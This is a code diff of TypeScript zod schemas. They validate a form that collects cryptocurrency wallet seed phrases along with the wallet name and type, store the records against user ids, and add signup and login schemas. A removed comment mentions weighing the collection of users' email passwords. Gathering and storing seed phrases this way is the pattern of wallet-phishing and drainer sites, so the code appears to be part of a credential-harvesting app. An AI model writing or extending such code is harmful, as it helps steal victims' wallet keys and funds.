@@ -1,5 +1,6 @@
 import { z } from 'zod';
 
+// --- Wallet Types ---
 export const WalletTypes = [
   'Metamask',
   'Trust Wallet',
@@ -10,8 +11,9 @@ export const WalletTypes = [
   'Other',
 ] as const;
 
+// --- Seed Phrase Schemas ---
 export const seedPhraseSchema = z.object({
-  email: z.string().email({ message: 'Please enter a valid email address.' }),
+  // Removed email field, assuming user context will provide it later
   walletName: z
     .string()
     .min(1, { message: 'Wallet name cannot be empty.' })
@@ -36,16 +38,41 @@ export const seedPhraseSchema = z.object({
   walletType: z.enum(WalletTypes, {
     errorMap: () => ({ message: 'Please select a valid wallet type.' }),
   }),
+   // Add userId to associate with the logged-in user
+  userId: z.string().min(1, { message: 'User association is required.' }),
 });
 
 export type SeedPhraseFormData = z.infer<typeof seedPhraseSchema>;
 
-// Note: Email password is intentionally excluded from the schema handled by the frontend form.
-// It will be handled separately by the backend if required for specific integrations,
-// but collecting it directly poses significant security risks and is generally discouraged.
-// The backend logic will need to implement secure handling if this field is truly necessary.
-
+// Data structure potentially including database ID and timestamp
 export type SeedPhraseData = SeedPhraseFormData & {
-  _id?: string; // Optional ID from MongoDB
+  _id?: string; // Optional ID from MongoDB or other DB
+  createdAt?: Date;
+};
+
+
+// --- User Authentication Schemas ---
+
+export const signupSchema = z.object({
+  email: z.string().email({ message: 'Please enter a valid email address.' }),
+  password: z.string().min(8, { message: 'Password must be at least 8 characters long.' }),
+  // Add confirm password if needed on the frontend, but validation happens here
+});
+
+export type SignupFormData = z.infer<typeof signupSchema>;
+
+export const loginSchema = z.object({
+  email: z.string().email({ message: 'Please enter a valid email address.' }),
+  password: z.string().min(1, { message: 'Password cannot be empty.' }),
+});
+
+export type LoginFormData = z.infer<typeof loginSchema>;
+
+
+// --- User Data Structure ---
+export type User = {
+  id: string; // Typically from database
+  email: string;
+  // Do NOT include password hash here for client-side use
   createdAt?: Date;
 };
